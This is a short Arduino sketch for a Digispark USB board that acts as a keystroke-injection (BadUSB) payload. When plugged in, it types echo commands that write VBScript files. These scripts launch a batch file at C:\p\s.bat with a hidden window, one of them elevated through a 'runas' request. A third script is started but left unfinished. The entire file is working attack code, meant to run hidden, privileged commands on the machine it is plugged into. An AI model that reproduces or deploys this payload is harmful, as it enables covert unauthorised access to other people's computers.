#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("echo set w=CreateObject(\"Shell.Application\") > as.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  DigiKeyboard.print("echo w.ShellExecute \"s.bat\",,\"C:\\p\", \"runas\", 0 >> as.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo set w=CreateObject(\"WScript.Shell\") > hs.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  DigiKeyboard.print("echo w.Run chr(34) ^& \"C:\\p\\s.bat\" ^& chr(34), 0 >> hs.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);

  DigiKeyboard.print("echo set w=CreateObject(\"WScript.Shell\") > ht.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
